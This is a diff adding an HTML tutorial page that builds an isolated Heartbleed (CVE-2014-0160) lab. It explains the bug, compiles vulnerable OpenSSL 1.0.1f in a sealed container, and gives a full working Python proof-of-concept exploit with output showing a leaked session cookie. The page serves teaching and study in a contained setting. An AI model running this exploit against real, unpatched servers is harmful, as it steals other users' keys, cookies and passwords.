@@ -1,0 +1,703 @@
+<!doctype html><html><head><meta charset=utf8><meta name=viewport content="width=device-width,initial-scale=1,viewport-fit=cover"><style>:root{color-scheme:light;box-sizing:border-box;padding-top:env(safe-area-inset-top,0px);padding-bottom:env(safe-area-inset-bottom,0px)}html{scroll-padding-top:env(safe-area-inset-top,0px)}body{margin:0;padding:0;font:14px -apple-system,BlinkMacSystemFont,sans-serif;background:#fff;color:#000}img{max-width:100%}[hidden]:not([hidden=until-found i]){display:none!important}</style></head><body>
+<meta name="claude:viewport-fit-sides" content="cover">
+<title>Heartbleed Lab</title>
+<style>
+  /* Layout: 2014 Bootstrap-3 flat style — centered container, jumbotron hero,
+     panels, alert boxes, light-grey pre blocks. Deliberately single (light) theme,
+     the way a real 2014 page looks. Hand-written since the CSP blocks CDN stylesheets. */
+  :root {
+    --blue: #337ab7;
+    --blue-dark: #23527c;
+    --red: #d9534f;
+    --bg: #ffffff;
+    --text: #333333;
+    --muted: #777777;
+    --border: #dddddd;
+    --panel-head: #f5f5f5;
+    --pre-bg: #f5f5f5;
+    --pre-border: #cccccc;
+    color-scheme: light;
+  }
+  * { box-sizing: border-box; }
+  html, body { margin: 0; }
+  body {
+    background: var(--bg);
+    color: var(--text);
+    font-family: "Helvetica Neue", Helvetica, Arial, sans-serif;
+    font-size: 14px;
+    line-height: 1.428571429;
+  }
+  .container {
+    max-width: 860px;
+    margin: 0 auto;
+    padding-left: max(15px, env(safe-area-inset-left, 0px));
+    padding-right: max(15px, env(safe-area-inset-right, 0px));
+    padding-block: 0 40px;
+  }
+  a { color: var(--blue); text-decoration: none; }
+  a:hover, a:focus { color: var(--blue-dark); text-decoration: underline; }
+  p { margin: 0 0 10px; }
+  h1,h2,h3,h4 { font-weight: 500; line-height: 1.1; color: inherit; }
+  h1 { font-size: 36px; margin: 20px 0 10px; }
+  h2 { font-size: 28px; margin: 20px 0 10px; }
+  h3 { font-size: 20px; margin: 18px 0 8px; }
+  h4 { font-size: 16px; margin: 14px 0 6px; }
+  small, .small { font-size: 85%; color: var(--muted); }
+
+  /* jumbotron */
+  .jumbotron {
+    background: #eeeeee;
+    padding: 34px 28px;
+    margin: 22px 0 22px;
+    border-radius: 6px;
+  }
+  .jumbotron h1 { font-size: 48px; margin-top: 0; }
+  .jumbotron p { font-size: 18px; font-weight: 200; color: #444; margin-bottom: 14px; }
+  .jumbotron .heart { color: var(--red); }
+
+  /* page-header (the hairline-underlined section titles) */
+  .page-header {
+    padding-bottom: 9px;
+    margin: 40px 0 20px;
+    border-bottom: 1px solid #eeeeee;
+  }
+  .page-header h2 { margin: 0; }
+  .page-header small { display: block; margin-top: 4px; font-size: 65%; }
+
+  /* labels / badges */
+  .label {
+    display: inline-block;
+    padding: .2em .6em .3em;
+    font-size: 75%;
+    font-weight: 700;
+    line-height: 1;
+    color: #fff;
+    text-align: center;
+    white-space: nowrap;
+    vertical-align: baseline;
+    border-radius: .25em;
+  }
+  .label-danger { background: var(--red); }
+  .label-info { background: #5bc0de; }
+  .label-warning { background: #f0ad4e; }
+  .label-success { background: #5cb85c; }
+  .label-default { background: #777; }
+
+  /* table of key facts under hero */
+  .dl-row { margin: 0 0 18px; }
+  .dl-row .label { margin-right: 6px; }
+
+  /* panels */
+  .panel {
+    margin-bottom: 20px;
+    background: #fff;
+    border: 1px solid var(--border);
+    border-radius: 4px;
+    box-shadow: 0 1px 1px rgba(0,0,0,.05);
+  }
+  .panel-heading {
+    padding: 10px 15px;
+    background: var(--panel-head);
+    border-bottom: 1px solid var(--border);
+    border-radius: 3px 3px 0 0;
+    font-weight: 600;
+  }
+  .panel-body { padding: 15px; }
+  .panel-body > :last-child { margin-bottom: 0; }
+
+  /* alert boxes */
+  .alert {
+    padding: 15px;
+    margin-bottom: 20px;
+    border: 1px solid transparent;
+    border-radius: 4px;
+  }
+  .alert h4 { margin-top: 0; color: inherit; }
+  .alert-danger  { color: #a94442; background: #f2dede; border-color: #ebccd1; }
+  .alert-info    { color: #31708f; background: #d9edf7; border-color: #bce8f1; }
+  .alert-success { color: #3c763d; background: #dff0d8; border-color: #d6e9c6; }
+  .alert-warning { color: #8a6d3b; background: #fcf8e3; border-color: #faebcc; }
+  .alert code { background: rgba(0,0,0,.05); color: inherit; }
+
+  /* inline code — the classic pink-on-pink */
+  code {
+    padding: 2px 4px;
+    font-size: 90%;
+    color: #c7254e;
+    background: #f9f2f4;
+    border-radius: 4px;
+    font-family: Menlo, Monaco, Consolas, "Courier New", monospace;
+  }
+
+  /* pre blocks */
+  .pre-wrap { position: relative; margin: 0 0 18px; }
+  pre {
+    display: block;
+    padding: 12px;
+    margin: 0;
+    font-size: 13px;
+    line-height: 1.5;
+    color: #333;
+    word-break: normal;
+    background: var(--pre-bg);
+    border: 1px solid var(--pre-border);
+    border-radius: 4px;
+    overflow-x: auto;
+    font-family: Menlo, Monaco, Consolas, "Courier New", monospace;
+    tab-size: 2;
+  }
+  pre code { padding: 0; font-size: inherit; color: inherit; background: transparent; border-radius: 0; white-space: pre; }
+  pre .prompt { color: #999; user-select: none; }
+  pre .cmt { color: #998; font-style: italic; }
+  pre .out { color: #555; }
+  pre .k { color: #0086b3; }
+  pre .s { color: #d14; }
+  pre .evil { color: #c7254e; font-weight: 700; }
+  pre .good { color: #3c763d; font-weight: 700; }
+
+  .pre-label {
+    font-family: Menlo, Monaco, Consolas, monospace;
+    font-size: 11px;
+    color: var(--muted);
+    background: #eaeaea;
+    border: 1px solid var(--pre-border);
+    border-bottom: none;
+    border-radius: 4px 4px 0 0;
+    padding: 4px 10px;
+    display: flex;
+    align-items: center;
+  }
+  .pre-label + pre { border-radius: 0 0 4px 4px; }
+  .pre-label .btn-copy {
+    margin-left: auto;
+    font-family: inherit;
+    font-size: 11px;
+    line-height: 1.4;
+    color: #fff;
+    background: var(--blue);
+    border: 1px solid #2e6da4;
+    border-radius: 3px;
+    padding: 1px 8px;
+    cursor: pointer;
+  }
+  .pre-label .btn-copy:hover { background: var(--blue-dark); }
+  .pre-label .btn-copy.done { background: #5cb85c; border-color: #4cae4c; }
+
+  /* diagram */
+  .figure { text-align: center; margin: 18px 0; }
+  .figure .thumbnail {
+    display: block;
+    padding: 8px;
+    background: #fff;
+    border: 1px solid var(--border);
+    border-radius: 4px;
+    overflow-x: auto;
+  }
+  .figure svg { display: block; width: 100%; height: auto; min-width: 560px; }
+  .figure .caption { font-size: 12px; color: var(--muted); margin-top: 6px; }
+
+  /* nav-tabs */
+  .nav-tabs {
+    list-style: none;
+    margin: 0 0 15px;
+    padding: 0;
+    border-bottom: 1px solid var(--border);
+    display: flex;
+  }
+  .nav-tabs li button {
+    border: 1px solid transparent;
+    border-radius: 4px 4px 0 0;
+    padding: 8px 15px;
+    margin-bottom: -1px;
+    background: transparent;
+    color: var(--blue);
+    font-size: 14px;
+    cursor: pointer;
+    font-family: inherit;
+  }
+  .nav-tabs li button:hover { background: #eee; }
+  .nav-tabs li button[aria-selected="true"] {
+    color: #555;
+    cursor: default;
+    background: #fff;
+    border-color: var(--border) var(--border) #fff;
+  }
+
+  /* packet anatomy table */
+  .table {
+    width: 100%;
+    max-width: 100%;
+    margin-bottom: 18px;
+    border-collapse: collapse;
+    font-size: 13px;
+  }
+  .table th, .table td {
+    padding: 8px;
+    border: 1px solid var(--border);
+    vertical-align: top;
+    text-align: left;
+  }
+  .table th { background: var(--panel-head); font-weight: 600; }
+  .table .mono { font-family: Menlo, Monaco, Consolas, monospace; white-space: nowrap; }
+  .table tbody tr:nth-child(odd) td { background: #f9f9f9; }
+  .table .evil-row td { background: #f2dede !important; }
+
+  /* checklist */
+  ul.checklist { list-style: none; padding: 0; margin: 12px 0; }
+  ul.checklist li { padding: 6px 0 6px 26px; position: relative; border-bottom: 1px solid #eee; }
+  ul.checklist li:before {
+    content: "\2610"; position: absolute; left: 0; top: 5px; color: var(--blue); font-size: 16px;
+  }
+
+  hr { border: 0; border-top: 1px solid #eee; margin: 24px 0; }
+  .footer { color: var(--muted); font-size: 12px; margin-top: 10px; }
+  :focus-visible { outline: 2px solid var(--blue); outline-offset: 2px; }
+  @media (max-width: 480px) {
+    .jumbotron h1 { font-size: 34px; }
+    .jumbotron { padding: 22px 18px; }
+    h1 { font-size: 28px; } h2 { font-size: 23px; }
+  }
+</style>
+
+<div class="container">
+
+  <!-- ===== JUMBOTRON HERO ===== -->
+  <div class="jumbotron">
+    <h1>The <span class="heart">Heartbleed</span> Lab</h1>
+    <p>Build a deliberately vulnerable TLS server inside an isolated container, then over-read its heap one heartbeat at a time &mdash; the real OpenSSL buffer over-read, reproduced on a machine that can only bleed into itself.</p>
+    <div class="dl-row">
+      <span class="label label-danger">CVE-2014-0160</span>
+      <span class="label label-warning">CVSS 7.5 High</span>
+      <span class="label label-info">CWE-125 Out-of-bounds Read</span>
+      <span class="label label-default">OpenSSL 1.0.1 &ndash; 1.0.1f</span>
+      <span class="label label-success">Fixed in 1.0.1g</span>
+    </div>
+  </div>
+
+  <!-- ===== SAFETY ===== -->
+  <div class="alert alert-danger">
+    <h4>Containment is the whole point</h4>
+    <p>Everything below runs against a server <strong>you</strong> built, bound to loopback inside a throwaway container. Do not point this tooling at any host you don't own. The vulnerable OpenSSL binary never leaves the sandbox &mdash; treat the container as radioactive and delete it when you're done.</p>
+  </div>
+
+  <!-- ===== 00 MECHANISM ===== -->
+  <div class="page-header">
+    <h2>00 &middot; What actually bleeds <small>The mechanism</small></h2>
+  </div>
+  <p>TLS has a keep-alive extension called the <strong>Heartbeat</strong> (RFC 6520). The client sends a small <code>HeartbeatRequest</code> carrying a payload and a number saying how long that payload is. The server is supposed to echo exactly those bytes back.</p>
+  <p>The bug: vulnerable OpenSSL <strong>trusts the length field and never checks it against the bytes actually received.</strong> You send a request whose payload is empty but whose length field claims 65535, and the server allocates a 65535-byte response buffer and <code>memcpy</code>s 65535 bytes starting at your (missing) payload &mdash; reading ~64 KB of whatever sat next to it on the heap. Private keys, session cookies, POSTed passwords, decrypted traffic. Then it mails that heap slice back to you.</p>
+
+  <div class="figure">
+    <span class="thumbnail">
+      <svg viewBox="0 0 580 300" xmlns="http://www.w3.org/2000/svg" font-family="Menlo, monospace">
+        <rect x="8" y="16" width="150" height="40" rx="4" fill="#eeeeee" stroke="#ccc"/>
+        <text x="83" y="41" text-anchor="middle" font-size="13" fill="#333" font-weight="700">ATTACKER</text>
+        <rect x="422" y="16" width="150" height="40" rx="4" fill="#eeeeee" stroke="#ccc"/>
+        <text x="497" y="41" text-anchor="middle" font-size="13" fill="#333" font-weight="700">VULN SERVER</text>
+
+        <line x1="160" y1="90" x2="420" y2="90" stroke="#d9534f" stroke-width="2" marker-end="url(#ar)"/>
+        <rect x="178" y="66" width="224" height="20" rx="3" fill="#f2dede" stroke="#ebccd1"/>
+        <text x="290" y="80" text-anchor="middle" font-size="11" fill="#a94442" font-weight="700">type=1  len=65535  payload=(empty)</text>
+
+        <text x="497" y="118" text-anchor="middle" font-size="10.5" fill="#777">server heap</text>
+        <rect x="432" y="124" width="24" height="26" fill="#f2dede" stroke="#d9534f"/>
+        <text x="444" y="141" text-anchor="middle" font-size="9" fill="#a94442">hb</text>
+        <rect x="456" y="124" width="116" height="26" fill="#fff" stroke="#ccc"/>
+        <text x="514" y="141" text-anchor="middle" font-size="9.5" fill="#777">adjacent memory &#8594;&#8594;&#8594;</text>
+        <path d="M444 150 L444 164 L560 164 L560 150" fill="none" stroke="#d9534f" stroke-width="1.5" stroke-dasharray="3 2"/>
+        <text x="502" y="178" text-anchor="middle" font-size="9.5" fill="#a94442">memcpy reads 65535 bytes from here</text>
+
+        <line x1="420" y1="214" x2="160" y2="214" stroke="#333" stroke-width="2" marker-end="url(#ar2)"/>
+        <rect x="150" y="190" width="260" height="20" rx="3" fill="#eeeeee" stroke="#ccc"/>
+        <text x="280" y="204" text-anchor="middle" font-size="10.5" fill="#333">response: ~65535 leaked heap bytes</text>
+
+        <text x="83" y="250" text-anchor="middle" font-size="10.5" fill="#a94442" font-weight="700">&#8595; keys &middot; cookies &middot; passwords</text>
+        <rect x="8" y="258" width="150" height="30" rx="4" fill="#f2dede" stroke="#d9534f"/>
+        <text x="83" y="278" text-anchor="middle" font-size="11" fill="#a94442" font-weight="700">attacker reads secrets</text>
+
+        <defs>
+          <marker id="ar" markerWidth="9" markerHeight="9" refX="7" refY="3" orient="auto"><path d="M0,0 L7,3 L0,6 Z" fill="#d9534f"/></marker>
+          <marker id="ar2" markerWidth="9" markerHeight="9" refX="7" refY="3" orient="auto"><path d="M0,0 L7,3 L0,6 Z" fill="#333"/></marker>
+        </defs>
+      </svg>
+    </span>
+    <div class="caption">One request, up to 64 KB of someone else's heap echoed back &mdash; repeat to walk the heap.</div>
+  </div>
+
+  <p>The fix in 1.0.1g is almost insultingly small: before echoing, check that <code>1 + 2 + payload_length + 16 &le; record_length</code>. If the claimed length doesn't fit in the record that arrived, silently drop it. Three lines.</p>
+
+  <!-- ===== 01 SETUP ===== -->
+  <div class="page-header">
+    <h2>01 &middot; Build the isolated range <small>Setup &mdash; pick your sandbox</small></h2>
+  </div>
+  <p>You need a Linux userland running an OpenSSL from the vulnerable window (1.0.1 &ndash; 1.0.1f). Modern distros ship patched OpenSSL, so the cleanest approach is a pinned old base image. Both paths below give you a self-contained target; Docker is more hermetic, WSL2 is fine if that's what you have.</p>
+
+  <ul class="nav-tabs" role="tablist" aria-label="Environment">
+    <li role="presentation"><button role="tab" id="t-docker" aria-selected="true" aria-controls="p-docker">Docker</button></li>
+    <li role="presentation"><button role="tab" id="t-wsl" aria-selected="false" aria-controls="p-wsl">WSL2</button></li>
+  </ul>
+
+  <div id="p-docker" role="tabpanel" aria-labelledby="t-docker">
+    <h3>1.1 &mdash; Create a throwaway lab network &amp; directory</h3>
+    <p>Keep everything in one folder and one user-defined bridge network so nothing touches your real interfaces.</p>
+    <div class="pre-wrap">
+      <div class="pre-label">bash &mdash; host <button class="btn-copy">copy</button></div>
+<pre><code><span class="prompt">$</span> mkdir heartbleed-lab &amp;&amp; cd heartbleed-lab
+<span class="prompt">$</span> docker network create --internal hb-net   <span class="cmt"># --internal = no outbound route</span></code></pre>
+    </div>
+    <div class="alert alert-info"><code>--internal</code> means containers on this network get no gateway to the outside world. The target literally cannot phone home.</div>
+
+    <h3>1.2 &mdash; Dockerfile: pin a vulnerable OpenSSL</h3>
+    <p>We compile OpenSSL 1.0.1f from source on an old Debian base, then run a tiny HTTPS server against it. Save as <code>Dockerfile</code>.</p>
+    <div class="pre-wrap">
+      <div class="pre-label">Dockerfile <button class="btn-copy">copy</button></div>
+<pre><code><span class="cmt"># Heartbleed target — OpenSSL 1.0.1f, isolated</span>
+FROM debian:jessie
+
+<span class="cmt"># jessie is EOL: point apt at the archive</span>
+RUN echo 'deb http://archive.debian.org/debian jessie main' &gt; /etc/apt/sources.list \
+ &amp;&amp; echo 'deb http://archive.debian.org/debian-security jessie/updates main' &gt;&gt; /etc/apt/sources.list \
+ &amp;&amp; apt-get -o Acquire::Check-Valid-Until=false update \
+ &amp;&amp; apt-get install -y --force-yes build-essential wget
+
+<span class="cmt"># --- build the vulnerable OpenSSL 1.0.1f ---</span>
+WORKDIR /build
+RUN wget https://www.openssl.org/source/old/1.0.1/openssl-1.0.1f.tar.gz \
+ &amp;&amp; tar xzf openssl-1.0.1f.tar.gz
+WORKDIR /build/openssl-1.0.1f
+RUN ./config shared --prefix=/usr/local/openssl-vuln \
+ &amp;&amp; make depend &amp;&amp; make &amp;&amp; make install
+
+<span class="cmt"># self-signed cert for the TLS server</span>
+WORKDIR /srv
+RUN /usr/local/openssl-vuln/bin/openssl req -x509 -newkey rsa:2048 -nodes \
+    -keyout key.pem -out cert.pem -days 365 \
+    -subj "/CN=heartbleed.lab" 2&gt;/dev/null
+
+COPY server.sh /srv/server.sh
+RUN chmod +x /srv/server.sh
+
+ENV LD_LIBRARY_PATH=/usr/local/openssl-vuln/lib
+EXPOSE 4433
+CMD ["/srv/server.sh"]</code></pre>
+    </div>
+
+    <h3>1.3 &mdash; The server launcher</h3>
+    <p>OpenSSL ships <code>s_server</code>, a built-in TLS server &mdash; perfect, because it's linked against the vulnerable library we just built. Save as <code>server.sh</code>. The server holds no secret of its own; in step 03 we'll drive a <em>victim's</em> secret through it over TLS, which is what actually lands on the heap.</p>
+    <div class="pre-wrap">
+      <div class="pre-label">server.sh <button class="btn-copy">copy</button></div>
+<pre><code><span class="cmt">#!/bin/bash</span>
+OPENSSL=/usr/local/openssl-vuln/bin/openssl
+echo "[*] vulnerable openssl: $($OPENSSL version)"
+echo "[*] TLS server up on :4433 — waiting for connections"
+
+<span class="cmt"># -www serves a trivial status page; each request is read into a heap buffer</span>
+exec $OPENSSL s_server -key /srv/key.pem -cert /srv/cert.pem \
+     -accept 4433 -www</code></pre>
+    </div>
+
+    <h3>1.4 &mdash; Build and run, bound to the isolated net only</h3>
+    <div class="pre-wrap">
+      <div class="pre-label">bash &mdash; host <button class="btn-copy">copy</button></div>
+<pre><code><span class="prompt">$</span> docker build -t hb-target .
+<span class="prompt">$</span> docker run -d --name target --network hb-net hb-target
+<span class="prompt">$</span> docker logs target
+<span class="out">[*] vulnerable openssl: OpenSSL 1.0.1f 6 Jan 2014</span>
+<span class="out">[*] TLS server up on :4433 — waiting for connections</span></code></pre>
+    </div>
+    <div class="alert alert-success"><strong>Target is live and sealed.</strong> It has no published port (<code>-p</code>) and no outbound route. The only way to reach it is from another container on <code>hb-net</code> &mdash; which is exactly where your attacker and victim will live.</div>
+  </div>
+
+  <div id="p-wsl" role="tabpanel" aria-labelledby="t-wsl" hidden>
+    <h3>1.1 &mdash; Isolate inside WSL2</h3>
+    <p>WSL2 already runs in its own lightweight VM. For an extra wall, do the build inside a disposable Docker container <em>within</em> WSL, or at minimum confine the server to loopback so nothing on your LAN can reach it. The compile steps match the Docker tab; only the isolation wrapper differs.</p>
+    <div class="pre-wrap">
+      <div class="pre-label">bash &mdash; WSL2 (Ubuntu) <button class="btn-copy">copy</button></div>
+<pre><code><span class="prompt">$</span> sudo apt update &amp;&amp; sudo apt install -y build-essential wget
+<span class="prompt">$</span> mkdir ~/hb-lab &amp;&amp; cd ~/hb-lab
+<span class="prompt">$</span> wget https://www.openssl.org/source/old/1.0.1/openssl-1.0.1f.tar.gz
+<span class="prompt">$</span> tar xzf openssl-1.0.1f.tar.gz &amp;&amp; cd openssl-1.0.1f
+<span class="prompt">$</span> ./config shared --prefix=$HOME/openssl-vuln
+<span class="prompt">$</span> make depend &amp;&amp; make &amp;&amp; make install</code></pre>
+    </div>
+    <div class="alert alert-warning"><strong>Heads up:</strong> on a modern toolchain the 1.0.1f build sometimes needs <code>-fgnu89-inline</code> added to <code>./config</code>. If <code>make</code> dies on inline-function errors, re-run as <code>./config shared -fgnu89-inline --prefix=$HOME/openssl-vuln</code>.</div>
+
+    <h3>1.2 &mdash; Cert and a loopback-only server</h3>
+    <div class="pre-wrap">
+      <div class="pre-label">bash &mdash; WSL2 (terminal 1) <button class="btn-copy">copy</button></div>
+<pre><code><span class="prompt">$</span> cd ~/hb-lab
+<span class="prompt">$</span> export LD_LIBRARY_PATH=$HOME/openssl-vuln/lib
+<span class="prompt">$</span> OPENSSL=$HOME/openssl-vuln/bin/openssl
+<span class="prompt">$</span> $OPENSSL req -x509 -newkey rsa:2048 -nodes -keyout key.pem -out cert.pem \
+      -days 365 -subj "/CN=heartbleed.lab"
+<span class="cmt"># bind to 127.0.0.1 ONLY — never reachable from the Windows LAN</span>
+<span class="prompt">$</span> $OPENSSL s_server -key key.pem -cert cert.pem -accept 127.0.0.1:4433 -www</code></pre>
+    </div>
+    <div class="alert alert-success"><strong>Loopback-bound.</strong> Binding to <code>127.0.0.1</code> instead of <code>0.0.0.0</code> means only processes inside this WSL instance can connect. Your victim and attacker run in the same WSL, in separate terminals. On WSL, use <code>127.0.0.1</code> wherever the Docker steps say <code>target</code>.</div>
+  </div>
+
+  <!-- ===== 02 RECON ===== -->
+  <div class="page-header">
+    <h2>02 &middot; Confirm the heartbeat is open <small>Reconnaissance</small></h2>
+  </div>
+  <p>Before firing the exploit, confirm the server actually advertises the heartbeat extension. The vulnerable OpenSSL's own <code>s_client</code> can do a legitimate heartbeat, and a TLS handshake dump shows the extension in the <code>ServerHello</code>.</p>
+  <div class="pre-wrap">
+    <div class="pre-label">bash &mdash; attacker container / 2nd WSL terminal <button class="btn-copy">copy</button></div>
+<pre><code><span class="cmt"># from an attacker container on hb-net:</span>
+<span class="prompt">$</span> docker run -it --rm --network hb-net hb-target bash
+<span class="prompt">#</span> OPENSSL=/usr/local/openssl-vuln/bin/openssl
+
+<span class="cmt"># 'target' resolves via docker DNS; 'B' then Enter sends a heartbeat</span>
+<span class="prompt">#</span> echo B | $OPENSSL s_client -connect target:4433 2&gt;&amp;1 | grep -i heart
+<span class="out">Extension: heartbeat</span>
+<span class="good">read R BLOCK</span>
+<span class="out">HEARTBEATING</span>              <span class="cmt"># &lt;- server answered a heartbeat</span></code></pre>
+  </div>
+  <div class="alert alert-info"><strong>What you just proved:</strong> the server speaks the heartbeat extension. A patched 1.0.1g server would still answer a <em>well-formed</em> heartbeat &mdash; the difference only shows when you lie about the length, which is the next step.</div>
+
+  <!-- ===== 03 EXPLOIT ===== -->
+  <div class="page-header">
+    <h2>03 &middot; Craft the malformed heartbeat <small>Exploitation</small></h2>
+  </div>
+  <p>This is the heart of it. We send a <code>HeartbeatRequest</code> by hand <strong>part-way through the TLS handshake &mdash; before it completes.</strong> Heartbleed needs no key exchange, no <code>Finished</code>, and no authentication: that's a big part of why it was so dangerous. The one lie is in the length field: <strong>payload_length declares 0x4000 (16384) bytes, but the request carries no payload at all.</strong> The record is only 3 bytes long &mdash; just enough for the type byte and the 2-byte length field.</p>
+
+  <table class="table">
+    <thead><tr><th>Bytes</th><th>Meaning</th></tr></thead>
+    <tbody>
+      <tr><td class="mono">18 03 02 00 03</td><td>TLS record header: type=24 (heartbeat), version TLS 1.1, <strong>record length = 3</strong></td></tr>
+      <tr><td class="mono">01</td><td>HeartbeatMessageType = request &nbsp;(byte 1 of 3)</td></tr>
+      <tr class="evil-row"><td class="mono">40 00</td><td>payload_length = <strong>16384</strong> &mdash; the lie &nbsp;(bytes 2&ndash;3 of 3)</td></tr>
+      <tr><td class="mono">&mdash;</td><td>payload actually sent: <strong>0 bytes</strong>. The record length of 3 is fully consumed by the type and length fields above, so there is no room for even one payload byte &mdash; which is the whole point.</td></tr>
+    </tbody>
+  </table>
+
+  <p>The script below is a faithful Python 3 port of Jared Stafford's original <code>ssltest.py</code>. The ClientHello is the complete, real packet (no placeholder) &mdash; it runs as-is.</p>
+  <div class="pre-wrap">
+    <div class="pre-label">heartbleed.py <button class="btn-copy">copy</button></div>
+<pre><code><span class="cmt">#!/usr/bin/env python3</span>
+<span class="cmt"># Faithful Heartbleed PoC (after Jared Stafford's ssltest.py), Python 3.</span>
+<span class="cmt"># For use ONLY against your own lab target.</span>
+<span class="k">import</span> sys, socket, struct
+
+<span class="k">def</span> h2bin(x):
+    <span class="k">return</span> bytes.fromhex(<span class="s">''</span>.join(x.split()))
+
+<span class="cmt"># A complete TLS 1.1 ClientHello advertising the heartbeat extension (0x000f).</span>
+hello = h2bin(<span class="s">'''
+16 03 02 00 dc 01 00 00 d8 03 02 53
+43 5b 90 9d 9b 72 0b bc 0c bc 2b 92 a8 48 97 cf
+bd 39 04 cc 16 0a 85 03 90 9f 77 04 33 d4 de 00
+00 66 c0 14 c0 0a c0 22 c0 21 00 39 00 38 00 88
+00 87 c0 0f c0 05 00 35 00 84 c0 12 c0 08 c0 1c
+c0 1b 00 16 00 13 c0 0d c0 03 00 0a c0 13 c0 09
+c0 1f c0 1e 00 33 00 32 00 9a 00 99 00 45 00 44
+c0 0e c0 04 00 2f 00 96 00 41 c0 11 c0 07 c0 0c
+c0 02 00 05 00 04 00 15 00 12 00 09 00 14 00 11
+00 08 00 06 00 03 00 ff 01 00 00 49 00 0b 00 04
+03 00 01 02 00 0a 00 34 00 32 00 0e 00 0d 00 19
+00 0b 00 0c 00 18 00 09 00 0a 00 16 00 17 00 08
+00 06 00 07 00 14 00 15 00 04 00 05 00 12 00 13
+00 01 00 02 00 03 00 0f 00 10 00 11 00 23 00 00
+00 0f 00 01 01
+'''</span>)
+
+<span class="cmt"># Malformed heartbeat: record length 3 = type(1) + length(2). Claim 0x4000, send 0.</span>
+hb = h2bin(<span class="s">'18 03 02 00 03   01   40 00'</span>)
+
+<span class="k">def</span> recv_all(s, n):
+    buf = b<span class="s">''</span>
+    <span class="k">while</span> len(buf) &lt; n:
+        chunk = s.recv(n - len(buf))
+        <span class="k">if</span> <span class="k">not</span> chunk:
+            <span class="k">return</span> None
+        buf += chunk
+    <span class="k">return</span> buf
+
+<span class="k">def</span> recv_record(s):
+    hdr = recv_all(s, 5)
+    <span class="k">if</span> hdr <span class="k">is</span> None:
+        <span class="k">return</span> None, None, None
+    typ, ver, ln = struct.unpack(<span class="s">'&gt;BHH'</span>, hdr)
+    <span class="k">return</span> typ, ver, recv_all(s, ln)
+
+host, port = sys.argv[1], int(sys.argv[2])
+s = socket.create_connection((host, port))
+s.send(hello)
+
+<span class="cmt"># Read the server's flight until ServerHelloDone (handshake msg type 0x0e).</span>
+<span class="cmt"># We fire HERE, mid-handshake — no key exchange, no Finished, no auth.</span>
+s.settimeout(5)
+<span class="k">while</span> True:
+    typ, ver, pay = recv_record(s)
+    <span class="k">if</span> typ <span class="k">is</span> None:
+        print(<span class="s">'[-] server closed during handshake'</span>); sys.exit(1)
+    <span class="k">if</span> typ == 22 <span class="k">and</span> pay <span class="k">and</span> pay[0] == 0x0e:
+        <span class="k">break</span>
+
+print(<span class="s">'[*] ServerHelloDone seen — firing heartbeat (handshake NOT completed)'</span>)
+s.send(hb)
+
+typ, ver, leak = recv_record(s)
+<span class="k">if</span> typ == 24:
+    print(<span class="s">'[!] BLED %d bytes back — we sent a 0-byte payload'</span> % len(leak))
+    <span class="k">for</span> i <span class="k">in</span> range(0, len(leak), 16):
+        chunk = leak[i:i+16]
+        hexs = <span class="s">' '</span>.join(<span class="s">'%02x'</span> % b <span class="k">for</span> b <span class="k">in</span> chunk)
+        text = <span class="s">''</span>.join(chr(b) <span class="k">if</span> 32 &lt;= b &lt; 127 <span class="k">else</span> <span class="s">'.'</span> <span class="k">for</span> b <span class="k">in</span> chunk)
+        print(<span class="s">'%04x  %-48s  %s'</span> % (i, hexs, text))
+<span class="k">elif</span> typ == 21:
+    print(<span class="s">'[-] got Alert — server looks PATCHED (1.0.1g+)'</span>)
+<span class="k">else</span>:
+    print(<span class="s">'[-] unexpected record type %r'</span> % typ)</code></pre>
+  </div>
+  <div class="alert alert-info"><strong>The two bytes that matter</strong> are the only interesting part of the heartbeat: <code>01</code> (this is a request) and <code>40 00</code> (claimed length 16384). Everything in the ClientHello is boilerplate that just gets you to a point where the server will accept a heartbeat; you can equally let the vulnerable <code>s_client</code> do the handshake and only hand-craft these three bytes.</div>
+
+  <h3>3.1 &mdash; Prime the heap with a victim's secret</h3>
+  <p>Now the correction that matters for a working demo. <strong>A single memory read only leaks what happens to be on the heap right now</strong> &mdash; and exporting an environment variable before launching <code>s_server</code> puts the secret in the process environment and on the stack, nowhere near the <code>OPENSSL_malloc</code>'d TLS buffers the heartbeat handler over-reads. To make the secret appear, it has to travel <em>through</em> the TLS channel, where it lands in exactly those heap buffers.</p>
+  <p>So model a <strong>victim</strong>: a user who keeps logging in over HTTPS, sending their secret in a cookie. Run this in its own terminal and leave it running.</p>
+  <div class="pre-wrap">
+    <div class="pre-label">bash &mdash; victim (3rd terminal / container on hb-net) <button class="btn-copy">copy</button></div>
+<pre><code><span class="prompt">$</span> docker run -it --rm --network hb-net hb-target bash
+<span class="prompt">#</span> OPENSSL=/usr/local/openssl-vuln/bin/openssl
+
+<span class="cmt"># the "victim" logs in over and over, secret riding in the Cookie header.</span>
+<span class="cmt"># each request is read into a server heap buffer next to the heartbeat buffer.</span>
+<span class="prompt">#</span> while true; do \
+    printf 'GET / HTTP/1.0\r\nCookie: SESSIONSECRET=the_cake_is_a_lie_42\r\n\r\n' \
+    | $OPENSSL s_client -quiet -connect target:4433 2&gt;/dev/null &gt;/dev/null; \
+  done</code></pre>
+  </div>
+  <div class="alert alert-warning"><strong>Why this, and not a planted variable?</strong> Heartbleed reads the heap region around OpenSSL's per-connection read buffers. Data only gets there by being received over a TLS connection. The victim loop is what guarantees the secret is resident where the over-read can catch it &mdash; and it's also a faithful model of the real attack, which stole <em>other users'</em> in-flight session data, not the server's own config.</div>
+
+  <h3>3.2 &mdash; Fire it</h3>
+  <div class="pre-wrap">
+    <div class="pre-label">bash &mdash; attacker (with the victim loop still running) <button class="btn-copy">copy</button></div>
+<pre><code><span class="prompt">#</span> python3 heartbleed.py target 4433
+<span class="out">[*] ServerHelloDone seen — firing heartbeat (handshake NOT completed)</span>
+<span class="evil">[!] BLED 16384 bytes back — we sent a 0-byte payload</span>
+<span class="out">0000  02 40 00 d8 03 02 53 43  5b 90 9d 9b 72 0b bc 0c  .@....SC[...r...</span>
+<span class="out">0120  47 45 54 20 2f 20 48 54  54 50 2f 31 2e 30 0d 0a  GET / HTTP/1.0..</span>
+<span class="out">0130  43 6f 6f 6b 69 65 3a 20  53 45 53 53 49 4f 4e 53  Cookie: SESSIONS</span>
+<span class="out">0140  45 43 52 45 54 3d 74 68  65 5f 63 61 6b 65 5f 69  ECRET=the_cake_i</span>
+<span class="out">0150  73 5f 61 5f 6c 69 65 5f  34 32 00 00 00 00 00 00  s_a_lie_42......</span></code></pre>
+  </div>
